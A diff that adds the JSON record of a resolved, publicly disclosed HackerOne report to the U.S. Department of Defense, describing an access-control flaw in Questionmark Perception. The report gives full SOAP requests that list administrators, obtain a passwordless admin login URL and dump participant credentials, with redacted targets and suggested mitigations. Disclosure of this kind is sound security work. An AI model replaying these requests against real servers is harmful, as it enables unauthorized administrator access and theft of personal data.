@@ -1,0 +1,118 @@
+{
+  "id": 1026146,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDI2MTQ2",
+  "url": "https://hackerone.com/reports/1026146",
+  "title": "Unauthorized access to admin panel of the Questionmark Perception system at https://██████████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-11-04T18:35:21.036Z",
+  "submitted_at": "2020-11-04T18:35:21.067Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "qdoan95",
+    "url": "/qdoan95",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-06-30T20:41:48.260Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-06-28T12:11:11.435Z",
+  "team_member_agreed_on_going_public_at": "2021-06-30T20:41:48.111Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nDue to the lack of access control, an anonymous attacker can compromise the administrator account on the Questionmark Perception system.\n\n**Description:**\nBy using the service description which publicly accessible on the internet, and by bypassing the access control, an anonymous attacker can (ab)use the method provided by the system and get the administrator access on the Questionmark Perception system.\n\n## Step-by-step Reproduction Instructions\n- Visit https://██████/█████████ to get all the Questionmark Web Integration Services' description.\n████\n\n- The method **GetAdministratorList** returns a list giving the full details of all the administrators in the database, as described in https://███████/███?████\n\n████████\n\n- Issuing the request shown above, but remove all the code between the <soapenv:Header> and the </soapenv:Header> tag like the request below:\n\n```\nPOST /███ HTTP/1.1\nHost: ████\nContent-Type: text/xml; charset=utf-8\nContent-Length: 328\nSOAPAction: \"http://questionmark.com/QMWISe/GetAdministratorList\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetAdministratorList xmlns=\"http://questionmark.com/QMWISe/\" />\n  </soap:Body>\n</soap:Envelope>\n```\n- The response shows us a list giving the full details of all the administrators in the database, included `Administrator_ID`, `Administrator_Name`, `Email`,...\n\n█████\n\n- The method **GetAccessAdministrator** processes an Administrator Name and returns a URL that enables the administrator to log in to Enterprise Manager (without using a password) if the administrator exists, so using the information we got above, we can (ab)use this method to get access to an administrator account.\n\n```\nPOST /███████ HTTP/1.1\nHost: ██████████\nContent-Type: text/xml; charset=utf-8\nContent-Length: 416\nSOAPAction: \"http://questionmark.com/QMWISe/GetAccessAdministrator\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetAccessAdministrator xmlns=\"http://questionmark.com/QMWISe/\">\n      <Administrator_Name>au_eliut</Administrator_Name>\n    </GetAccessAdministrator>\n  </soap:Body>\n</soap:Envelope>\n```\n- The response gives us a link to login without using a password.\n\n```\nHTTP/1.1 200 OK\nCache-Control: private, max-age=0\nContent-Type: text/xml; charset=utf-8\nServer: 0\nX-AspNet-Version: 2.0.50727\nStrict-Transport-Security: max-age=63072000;includeSubDomains;preload\nDate: Wed, 04 Nov 2020 18:18:46 GMT\nContent-Length: 565\nSet-Cookie: BIGipServer██████████████ path=/; Httponly; Secure\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><soap:Body><GetAccessAdministratorResponse xmlns=\"http://questionmark.com/QMWISe/\"><URL>https://█████████/em5/exlogin.asp?CustomerID=AuthoringRepository&amp;USER=au_eliut&amp;EXPIRY=04:11:2020:13:18&amp;CHECKSUM=db69772f40b1a71179fd96e1bceebed003f3049e03a78e7d009c4627d387da2c</URL></GetAccessAdministratorResponse></soap:Body></soap:Envelope>\n\n```\n██████████\n- Using the link above: `https://██████████/████████` to login as admin.\n\n████████\n\n## Suggested Mitigation/Remediation Actions\n- Remove the service description at https://██████/█████████\n- Re-configure the system, to deny all the request without the SOAP \"Trust\" header.\n\n## Impact\n\nIncorrect access restriction to the authorized interface of the site leads to information leakage. [As Questionmark describes,](https://support.questionmark.com/content/web-services) an admin can view all fields of the questions, the results, and personal information of the participants.\n\nFor example, issuing the request below to get all the participants' information such as username, password,...\n\n```\nPOST /██████ HTTP/1.1\nHost: ███████\nContent-Type: text/xml; charset=utf-8\nContent-Length: 326\nSOAPAction: \"http://questionmark.com/QMWISe/GetParticipantList\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetParticipantList xmlns=\"http://questionmark.com/QMWISe/\" />\n  </soap:Body>\n</soap:Envelope>\n```\n\n█████",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 12,
+  "voters": [
+    "thaivu",
+    "shreyaschavhan",
+    "pwrspl0it",
+    "mohaned0101",
+    "hundredpercent",
+    "sa1tama0",
+    "soohongkim123",
+    "xhxfo",
+    "ekgaribadmi",
+    "destinedtohack",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
